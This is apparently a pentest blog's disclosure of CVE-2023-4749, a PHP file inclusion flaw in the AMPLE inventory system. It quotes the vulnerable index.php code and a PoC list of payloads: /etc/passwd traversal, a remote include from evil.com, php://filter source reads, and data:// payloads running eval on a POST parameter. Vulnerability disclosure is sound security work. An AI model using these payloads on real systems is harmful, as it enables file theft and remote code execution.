=== Content from skypoc.wordpress.com_c1e2a546_20250111_184928.html ===

[コンテンツへスキップ](#content)
[![ギカク](https://skypoc.wordpress.com/wp-content/uploads/2023/09/cropped-czj5l300402x.png)](https://skypoc.wordpress.com/)

[ギカク](https://skypoc.wordpress.com/)

ペンテストと脆弱性診断Blog

メニュー

* [Home](https://skypoc.wordpress.com)
* [About me](https://skypoc.wordpress.com/about-me/)
* [ペネトレーションテスト](https://skypoc.wordpress.com/category/%E3%83%9A%E3%83%8D%E3%83%88%E3%83%AC%E3%83%BC%E3%82%B7%E3%83%A7%E3%83%B3%E3%83%86%E3%82%B9%E3%83%88/)
* [経験メモ](https://skypoc.wordpress.com/category/%E7%B5%8C%E9%A8%93%E3%83%A1%E3%83%A2/)
* [Bug Hunt](https://skypoc.wordpress.com/category/bug-hunt/)
* [CTF](https://skypoc.wordpress.com/category/ctf/)
* [CVE](https://skypoc.wordpress.com/category/cve/)
* [PoC](https://skypoc.wordpress.com/category/poc/)

# 【CVE-2023-4749】Open Source AMPLE Inventory Management System has a File Inclusion Vulnerability

[Gi](https://skypoc.wordpress.com/author/skypoc/ "Gi の投稿")
[CVE](https://skypoc.wordpress.com/category/cve/)
2023年9月3日2023年9月12日
1 Minutes
## Update

**Update 2023/09/04**

The vulnerability has been included and approved for public disclosure by MITRE.

[CVE Record：CVE-2023-4749](https://www.cve.org/CVERecord?id=CVE-2023-4749)

[NVD-CVE-2023-4749](https://nvd.nist.gov/vuln/detail/CVE-2023-4749)

**Update 2023/09/03**

On September 3rd, I submitted the vulnerability to the [VulDB](https://vuldb.com/?id.238638) and was assigned a CVE number.

**Vuln\_Author: WEI（ギカク）**

# AMPLE

AMPLE is an open source inventory management system , written in php , for inventory management and monitoring of goods.

The following powerful features are included:

* Real-time Stock Visibility: Keep track of your inventory levels in real-time, ensuring you never run out of stock or overstock.
* Accurate Sales Tracking: Monitor sales patterns, identify popular products, and make data-driven decisions.
* Order Management: Process orders efficiently, reducing fulfillment time and enhancing customer satisfaction.
* Cost Savings: Minimize losses due to overstocking, spoilage, or theft, maximizing profitability.

## File Inclusion Vulnerability

The file inclusion vulnerability exists in the index.php file with the following source code

```

<?php require_once 'inc/header.php'; ?>
<?php require_once 'inc/sidebar.php'; ?>

  <!-- Content Wrapper. Contains page content -->

  <?php
        if (isset($_GET['page'])) {
          $page ='pages/' .$_GET['page'].'.php';

        }else{
          $page = 'pages/dashboard.php';
        }
        if (file_exists($page)) {
          require_once $page;
        }else{
          require_once 'pages/error_page.php';
        }
 ?>
  <!-- Control Sidebar -->
  <aside class="control-sidebar control-sidebar-dark">
    <!-- Control sidebar content goes here -->
  </aside>
  <!-- /.control-sidebar -->

 <?php require_once 'inc/footer.php'; ?>

```

![](https://skypoc.wordpress.com/wp-content/uploads/2023/09/jjbymwxw402x.png?w=1024)

This code has a file inclusion vulnerability.

**[CWE-98](https://cwe.mitre.org/data/definitions/98.html)**

Unsanitized input from an HTTP parameter flows into require\_once, where it is included dynamically. Allowing unvalidated user input to control files that are included dynamically in PHP can lead to malicious code execution.

## PoC

Since it is a common file inclusion vulnerability, it can be very simple to construct a piece of malicious code to trigger the vulnerability.

```
http://example.com/index.php?page=../../../etc/passwd
http://example.com/index.php?filename=http://evil.com/malicious.php
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index
http://example.com/index.php?page=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==
?c=data://text/plain,<?php echo "Gikaku";?>
?c=data://text/plain,<?php eval($_POST['cmd']);?>

```
![](https://skypoc.wordpress.com/wp-content/uploads/2023/09/1.png?w=1024)

### 共享此文章：

* [Twitter](https://skypoc.wordpress.com/2023/09/03/%E3%80%90code-audit%E3%80%91open-source-ample-inventory-management-system-v1-0-by-mayuri_k-has-a-file-inclusion-vulnerability/?share=twitter "クリックして Twitter で共有")
* [Facebook](https://skypoc.wordpress.com/2023/09/03/%E3%80%90code-audit%E3%80%91open-source-ample-inventory-management-system-v1-0-by-mayuri_k-has-a-file-inclusion-vulnerability/?share=facebook "Facebook で共有するにはクリックしてください")
いいね 読み込み中…

**公開済み**
2023年9月3日2023年9月12日

## 投稿ナビゲーション

[Previous Post 2023年1月~8月日本国内企業の脆弱性報告状況](https://skypoc.wordpress.com/2023/08/08/2023%E5%B9%B41%E6%9C%888%E6%9C%88%E6%97%A5%E6%9C%AC%E5%9B%BD%E5%86%85%E4%BC%81%E6%A5%AD%E3%81%AE%E8%84%86%E5%BC%B1%E6%80%A7%E5%A0%B1%E5%91%8A%E7%8A%B6%E6%B3%81/)[Next Post 【CVE-2023-4847】【CVE-2023-4848】SourceCodester Simple Book Catalog App v1.0 has multiple vulnerabilities](https://skypoc.wordpress.com/2023/09/04/sourcecodester-simple-book-catalog-app-v1-0-has-multiple-vulnerabilities/)

[WordPress.com ホスティングサイト](https://wordpress.com/ja/?ref=footer_custom_powered).

* リブログ
* 登録
  開始日

  + [![](https://skypoc.wordpress.com/wp-content/uploads/2024/11/cropped-jmq4ccvq402x.png?w=50) ギカク](https://skypoc.wordpress.com)

  登録する

  + WordPress.com のアカウントをすでにお持ちですか ? [今すぐログイン](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fskypoc.wordpress.com%2F2023%2F09%2F03%2F%E3%80%90code-audit%E3%80%91open-source-ample-inventory-management-system-v1-0-by-mayuri_k-has-a-file-inclusion-vulnerability%2F&signup_flow=account)
* プライバシー
* + [![](https://skypoc.wordpress.com/wp-content/uploads/2024/11/cropped-jmq4ccvq402x.png?w=50) ギカク](https://skypoc.wordpress.com)
  + [カスタマイズ](https://skypoc.wordpress.com/wp-admin/customize.php?url=https%3A%2F%2Fskypoc.wordpress.com%2F2023%2F09%2F03%2F%25E3%2580%2590code-audit%25E3%2580%2591open-source-ample-inventory-management-system-v1-0-by-mayuri_k-has-a-file-inclusion-vulnerability%2F)
  + 登録
    開始日
  + [登録](https://wordpress.com/start/)
  + [ログイン](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fskypoc.wordpress.com%2F2023%2F09%2F03%2F%E3%80%90code-audit%E3%80%91open-source-ample-inventory-management-system-v1-0-by-mayuri_k-has-a-file-inclusion-vulnerability%2F&signup_flow=account)
  + [短縮リンクをコピー](https://wp.me/pcbw4P-rb)
  + [このコンテンツを報告](https://wordpress.com/abuse/?report_url=https://skypoc.wordpress.com/2023/09/03/%e3%80%90code-audit%e3%80%91open-source-ample-inventory-management-system-v1-0-by-mayuri_k-has-a-file-inclusion-vulnerability/)
  + [Reader で投稿を表示](https://wordpress.com/read/blogs/180060947/posts/1685)
  + [購読管理](https://subscribe.wordpress.com/)
  + このバーを折りたたむ

##

##

コメントを読み込み中…

コメントを投稿するにはログインしてください。

###

%d

![](https://pixel.wp.com/b.gif?v=noscript)
WordPress.com で次のようなサイトをデザイン[始めてみよう](https://wordpress.com/start/ja?ref=marketing_bar)


